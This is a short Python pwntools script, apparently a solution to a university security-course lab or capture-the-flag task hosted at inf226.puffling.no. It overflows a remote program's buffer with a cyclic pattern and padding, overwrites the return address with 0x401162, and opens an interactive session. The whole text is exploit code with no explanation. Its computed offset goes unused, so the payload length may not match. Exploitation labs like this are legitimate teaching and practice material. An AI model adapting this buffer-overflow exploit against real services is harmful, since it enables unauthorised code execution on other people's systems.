from pwn import*

context.log_level = 'debug'
io = remote('inf226.puffling.no',7003)

off = cyclic_find('kaaa')
buf = cyclic(1024)
target = packing.p64(0x401162)
data = buf + b'X'*32 + target
io.sendline(data)
io.recv()
io.interactive()